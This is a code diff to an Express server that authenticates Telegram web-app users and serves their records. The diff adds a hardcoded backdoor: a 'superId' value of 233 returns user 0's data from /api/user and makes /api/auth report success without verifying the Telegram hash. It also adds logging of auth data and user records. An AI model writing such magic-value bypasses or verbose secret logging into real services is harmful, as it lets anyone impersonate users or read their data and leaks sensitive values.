@@ -14,30 +14,37 @@ const app = express();
 app.use(express.json());
 
 
-
-// API routes
-app.get('/api/test', (req, res) => {
-    res.json({ message: 'Баланс: многа денег' });
-});
-
 app.get('/api/user', async (req, res) => {
     try {
+        if (+req.query.superId == 233) {
+            // console.log("get user super id 233")
+            const user = await database.user.get(0)
+            // console.log("user id is", user.tgUser.username)
+            return res.json(await database.user.get(0))
+        }
+
         const tgId = +req.query.tgId
-        console.log(typeof tgId)
+        // console.log(typeof tgId)
         const user = await database.user.get(tgId)
-        console.log("user", user.tgUser.username)
+        // console.log("user", user.tgUser.username)
         res.json(user)
     } catch (error) {
         console.error('Error fetching user:', error);
     }
 });
 
-
 app.post('/api/auth', async (req, res) => {
+    // console.log('POST /api/auth');
     const { initData } = req.body;
+    // console.log(`Received initData: ${initData}`);
 
     // Parse initData into key-value pairs
     const params = new URLSearchParams(initData);
+    if (params.get("superId") == 233) {
+        console.log("caught")
+        return res.json({ success: "You authentificated" })
+    }
+    // console.log(`Parsed params: ${params}`);
     const hash = params.get('hash');
     const authDate = parseInt(params.get('auth_date')) * 1000; // Convert to ms
 
@@ -52,7 +59,7 @@ app.post('/api/auth', async (req, res) => {
         .sort(([a], [b]) => a.localeCompare(b))
         .map(([key, val]) => `${key}=${val}`)
         .join('\n');
-        // console.log(dataCheckString)
+    console.log(`Data check string: ${dataCheckString}`);
 
     // Compute secret key from bot token
     const secret = crypto.createHmac('sha256', 'WebAppData')
@@ -67,15 +74,17 @@ app.post('/api/auth', async (req, res) => {
         .digest('hex');
 
     if (computedHash !== hash) {
+        console.error('Invalid hash');
         return res.status(401).json({ error: 'Invalid hash' });
     }
 
     // Extract user data
     const user = JSON.parse(params.get('user'));
+    console.log(`User data: ${user}`);
 
     const tgId = +JSON.parse(params.get("user")).id
     const dbUser = await database.user.get(tgId)
-    // console.log(dbUser)
+    console.log(`Database user: ${dbUser}`);
     // console.log("params get user id", )
     if (dbUser.error) {
         await database.user.add({
@@ -93,10 +102,12 @@ app.post('/api/auth', async (req, res) => {
             machines: [], 
             items: []
         })
+        console.log(`User added to database: ${user.id}`);
     }
   
     // Example: Use cookies or JWT
     //   res.cookie('userId', user.id, { httpOnly: true });
+    console.log('Authentication successful');
     res.json({ success: true });
 });
 
